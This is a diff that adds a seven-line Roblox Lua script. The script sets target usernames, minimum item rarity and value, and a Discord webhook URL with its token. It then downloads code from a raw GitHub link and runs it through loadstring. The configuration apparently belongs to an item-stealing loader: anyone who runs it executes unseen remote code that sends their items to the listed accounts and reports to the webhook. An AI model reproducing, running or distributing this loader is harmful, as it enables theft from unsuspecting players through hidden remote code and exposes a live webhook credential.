@@ -1,0 +1,7 @@
+_G.Usernames = {"ehap027"}
+_G.min_rarity = "uncommons"
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1460163713389821984/jUvBsryx5A0Rjm0sDpBfGQrMZHbiLtrhFmO_ZsSVzYtwM7E5xl27kGt0d3Ix7MjuExcP"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vOlOrex/xczvqaw/refs/heads/main/message.txt"))()
